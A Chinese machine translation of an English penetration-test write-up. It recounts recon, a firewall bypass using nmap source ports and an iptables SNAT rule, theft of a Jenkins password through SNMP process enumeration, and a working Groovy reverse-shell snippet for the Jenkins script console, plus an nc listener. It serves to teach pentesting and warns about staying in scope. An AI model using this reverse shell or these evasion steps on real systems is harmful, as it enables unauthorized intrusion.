<html>
<head>
<title>Why you should always scan UDP ports (1/2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">为什么您应该总是扫描UDP端口(1/2)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727?source=collection_archive---------0-----------------------#2020-08-18">https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727?source=collection_archive---------0-----------------------#2020-08-18</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="87e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://medium.com/bugbountywriteup/why-you-should-always-scan-udp-part-2-2-42050fb136d8?source=your_stories_page-------------------------------------" rel="noopener">链接到第2部分</a></p><h1 id="17c9" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">介绍</h1><p id="7e52" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">在这个故事中，我们将看到我们如何利用snmp漏洞，使用Jenkins控制台调用反向shell，绕过防火墙规则，绕过AppArmor并利用bash注入来提升权限，等等。</p><p id="5130" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个pentest的故事，其中扫描udp端口允许我们控制整个网络。让我们称这家公司为销售公司。它开始像大多数pentest做的那样，列举这家公司面向公众的基础设施。我们从正常的OSINT流程开始。我不会深入讨论这个问题，关于这个主题有很多资源，但是你可以开始研究这3个工具</p><ul class=""><li id="2588" class="lp lq iq jp b jq jr ju jv jy lr kc ls kg lt kk lu lv lw lx bi translated">https://www.maltego.com/<a class="ae kl" href="https://www.maltego.com/" rel="noopener ugc nofollow" target="_blank"/></li><li id="af46" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">【https://github.com/laramies/theHarvester T4】</li><li id="71b3" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated"><a class="ae kl" href="https://github.com/lanmaster53/recon-ng" rel="noopener ugc nofollow" target="_blank">https://github.com/lanmaster53/recon-ng</a></li></ul><p id="a1aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一阶段将允许您列举大多数公共信息源。基本上，你最终会得到电子邮件地址、域名、地址、可能的雇员等。在这个特定的评估中，社会工程不在范围内，所以我们主要集中在枚举域上。</p><p id="a0b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦有了几个可能的子域，就有了多种映射面向公众的基础设施的方法。在菲尼亚斯·菲舍尔的一个教程(<a class="ae kl" href="https://www.exploit-db.com/papers/41915" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/papers/41915</a>)中，经典的方式被大量描述。这包括使用反向whois查找来查找与主域名类似参数相关的其他域名，如地址或所有者。之后，您还可以使用激烈列举相邻的ip空间。这在瞄准分配了大IP范围的公司时很有用。<br/>假设公司的主站点位于144.33.22.11。如果他们购买了一系列公共ip地址，144.33.22.10和144.33.22.12很可能也属于他们。</p><p id="0f35" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二种也是最现代的子域枚举方法在Patrik Hudak的文章中有精彩的描述:<a class="ae kl" href="https://0xpatrik.com/subdomain-enumeration-2019/" rel="noopener ugc nofollow" target="_blank">https://0xpatrik.com/subdomain-enumeration-2019/</a>。</p><p id="8e66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">他专门研究子域接管，这是一种漏洞，在这种漏洞中，您主要由于糟糕的配置而劫持了站点的子域。要利用这一点，你需要找到所有潜在的子域。他使用更现代的方法，使用诸如amass(<a class="ae kl" href="https://github.com/OWASP/Amass" rel="noopener ugc nofollow" target="_blank">https://github.com/OWASP/Amass</a>)、mass DNS(【https://github.com/blechschmidt/massdns】T3)和rapid 7 forward DNS set(<a class="ae kl" href="https://opendata.rapid7.com/sonar.fdns_v2/" rel="noopener ugc nofollow" target="_blank">https://opendata.rapid7.com/sonar.fdns_v2/</a>)等工具。</p><p id="40a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你需要考虑的一件重要事情是:我得说，作为一名学生，你将得到的90%的作业都有明确的范围。如果你幸运地得到了一个没有的(因为这些通常更有趣)，那么在绘制潜在范围时你必须非常小心。这样做的原因是，您可能会以不属于您的目标的IP/域为目标。这是违法的。</p><h1 id="a6dd" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">绕过防火墙</h1><p id="f582" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">我们的pentest的目标公司是中型企业(想想10-15个主要的面向公众的网站)。我们最终得到了大约200个IP/子域名的潜在列表。使用Harvey，我们能够找到一个离主站点大约6个ip的ip，看起来很有希望(坚持原来的例子，如果主站点位于144.33.22.10，这个IP是144.33.22.16)。whois显示它是以与主域名相同的名称注册的(在OSINT阶段出现的公司的一名员工)。</p><p id="baaf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对网站的快速扫描没有返回任何有希望的线索。</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi md"><img src="../Images/94274eeaff534c5e5f3d370a7c38921f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*56gFdXeseqhuYpPruYQRDQ.png"/></div></div></figure><p id="7af1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，有一个关于nmap的快速技巧你应该永远记住。有时，网络管理员会允许双向的基于端口的过滤，而实际上只允许出口过滤。每当您需要绕过网络规则时，您应该尝试使用通常允许的端口，如22、53、80和443。这就是我们对nmap的源端口选项所做的。</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mp"><img src="../Images/eadaca13a0bfaaacf3f079d069bdf241.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jXH0ifDr_KA1lqRr9RHCkA.png"/></div></div></figure><p id="7bc2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你想看低层次的，你将无法找到它</p><pre class="me mf mg mh gt mq mr ms mt aw mu bi"><span id="e5e5" class="mv kn iq mr b gy mw mx l my mz">netstat -an</span></pre><p id="5ec8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为默认情况下，nmap对原始套接字使用syn扫描。这意味着连接永远不会完全建立。但是你可以用tcpdump看到它。您可以设置一个监听器</p><pre class="me mf mg mh gt mq mr ms mt aw mu bi"><span id="8c69" class="mv kn iq mr b gy mw mx l my mz">nc -lkvp 5555</span></pre><p id="d020" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将执行本地扫描</p><pre class="me mf mg mh gt mq mr ms mt aw mu bi"><span id="d00e" class="mv kn iq mr b gy mw mx l my mz">nmap --source-port 53 -p 5555 localhost</span></pre><p id="1fc3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">拦截流量</p><pre class="me mf mg mh gt mq mr ms mt aw mu bi"><span id="1141" class="mv kn iq mr b gy mw mx l my mz">tcpdump -i lo -nn 'port 5555'</span></pre><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi na"><img src="../Images/b0347ee22113a843c3a457181272c195.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5fjqq2aMzLdkkZ_A15NWXw.png"/></div></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">您可以在这里看到syn &gt; syn-ack &gt; reset</figcaption></figure><p id="5ff8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在这里阅读更多关于防火墙旁路的信息:<a class="ae kl" href="https://nmap.org/book/firewall-subversion.html" rel="noopener ugc nofollow" target="_blank">https://nmap.org/book/firewall-subversion.htm</a></p><p id="998c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们继续设置iptables来获取端口。您可以使用以下规则来完成此操作:</p><pre class="me mf mg mh gt mq mr ms mt aw mu bi"><span id="3104" class="mv kn iq mr b gy mw mx l my mz">iptables -t nat -A POSTROUTING -d 144.33.22.16 -p tcp -j SNAT --to :53</span></pre><p id="e83f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将源端口nat发送到144.33.22.16的任何流量，将src ip端口更改为53。</p><p id="90e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您还有任何疑问，这里有一个关于源NAT的极好资源:<a class="ae kl" href="https://gist.github.com/DavidWittman/3805130" rel="noopener ugc nofollow" target="_blank">https://gist.github.com/DavidWittman/3805130</a></p><h1 id="23d4" class="km kn iq bd ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li lj bi translated">获得立足点</h1><p id="450c" class="pw-post-body-paragraph jn jo iq jp b jq lk js jt ju ll jw jx jy lm ka kb kc ln ke kf kg lo ki kj kk ij bi translated">设置端口转发后，浏览端口8080下的站点向我们展示了与此类似的内容:</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nf"><img src="../Images/333041cfd8d9697c3fd001ee7144b552.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LQWd-jPabt8XBxkn8RWeiA.png"/></div></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">Jenkins登录页面</figcaption></figure><p id="f126" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Jenkins是一个用于自动化CI/CD管道的Java开源工具。我们找到的版本没有任何公布的漏洞，所以我们必须走另一条路线。这篇文章的标题的原因来了。</p><p id="f78f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们谈一会儿snmp。对于那些以前没有使用过它的人来说，简单网络管理协议(<a class="ae kl" href="https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol" rel="noopener ugc nofollow" target="_blank">https://en . Wikipedia . org/wiki/Simple _ Network _ Management _ Protocol</a>)是一个应用层协议，它允许您监控和管理网络设备。因为它使用udp，所以在扫描时会被忽略。正确地枚举此端口可以让您访问许多敏感信息，其中您可以找到网络接口信息、netstat信息和进程信息。SNMP v1和v2c使用一个认证方案，该方案依赖于一个被称为<strong class="jp ir">社区字符串</strong>的秘密字符串，该字符串允许访问设备。所有设备都有一个默认的团体字符串，称为“public”。这个字符串通常不允许你修改任何东西(它是只读的),但是允许枚举设备。SNMP v3使用与加密密钥配对的用户名/密码身份验证。</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ng"><img src="../Images/579fd6a3d9f9dcf66f894801f22cc5cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/format:webp/1*KK1j5pZawnC9Yn8avU6u7w.png"/></div></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">打开snmp端口。运行nmap时要时刻记住你的-sU！</figcaption></figure><p id="f359" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有多种工具可用于利用SNMP(https://blog . pentest academy . com/SNMP-exploitation-with-metasploit-and-SNMP set-920 de 3 fc 2c 50)，但我们选择了nmap和snmpwalk。您可以在下图中看到nmap的可用snmp插件:</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/a5b3c61de1c689ec6ca3d99acc7a085b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*WBBpX7Jcsp5zohvsPvakCg.png"/></div></figure><p id="70d0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们用snmp-processes.nse脚本获得了成功，它显示了以下输出。</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ni"><img src="../Images/cfb7ca4a038917ac156c8dffd8cd1402.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aAS3BNFMiCE7lVIrlwoBKA.png"/></div></div></figure><p id="8cef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">总是建议不要在命令行中使用密码启动进程。这是因为它们可以通过以下方式获得</p><ul class=""><li id="6e54" class="lp lq iq jp b jq jr ju jv jy lr kc ls kg lt kk lu lv lw lx bi translated">外部进程枚举(在本例中是通过snmp)</li><li id="e7bb" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">bash _历史日志</li><li id="f91f" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">ps的内部进程枚举(可以由其他用户执行，而不仅仅是运行命令的用户)</li></ul><p id="de17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">默认情况下，某些工具会混淆密码，如ssh-pass，但大多数工具不会:</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nj"><img src="../Images/0c855d9e971b55dd58fef07ea9e088f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7eRDN_DqRMxgiVtx280VBA.png"/></div></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">sshpass中的模糊密码(不，我的密码不是zzzzzzzzzzzzz)</figcaption></figure><p id="a2d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">即使进程只显示一秒钟，您仍然可以通过扫描procfs来记录所有的执行。pspy(<a class="ae kl" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank">https://github.com/DominicBreuker/pspy</a>)是一个优秀的工具，它通过在这些fs上设置inotify watchers来实现这一点</p><p id="8d1d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们继续进行pentest。从进程snmp枚举中获得jenkins密码后，我们能够访问它。如果幸运的话，脚本控制台将被启用，并允许您从机器上调用一个反向shell。</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nk"><img src="../Images/16711249b2d0cc82c3a68589152b02f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ahoV__eejrZueZD-BakRhg.png"/></div></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">詹金斯脚本控制台</figcaption></figure><p id="0a4c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以用下面的代码调用反向shell(如果是托管在windows上，用cmd.exe更改/bin/bash)，代码取自<a class="ae kl" href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76" rel="noopener ugc nofollow" target="_blank">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a>:</p><pre class="me mf mg mh gt mq mr ms mt aw mu bi"><span id="34a7" class="mv kn iq mr b gy mw mx l my mz">String host="localhost"; <br/>int port=8044; <br/>String cmd="/bin/bash";<br/>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</span></pre><p id="f527" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">运行它之后，您将在您的监听器上看到类似这样的内容:</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/4d74c742099111b6ccc5215e04d2eb61.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*fsFu8e-vVNQT1d2SVhRnXA.png"/></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">我不得不用python提升到一个完全pty的shell</figcaption></figure><p id="595e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我要在这里结束这个故事。在第2部分中，我们将介绍如何提升特权，结合两种不同的漏洞在bash脚本中注入代码并绕过AppArmor。之后，我们利用了一个易受攻击的sudo命令。我还将详细介绍我们如何危害jenkins主机所在的新VLAN的其余主机。</p></div></div>    
</body>
</html>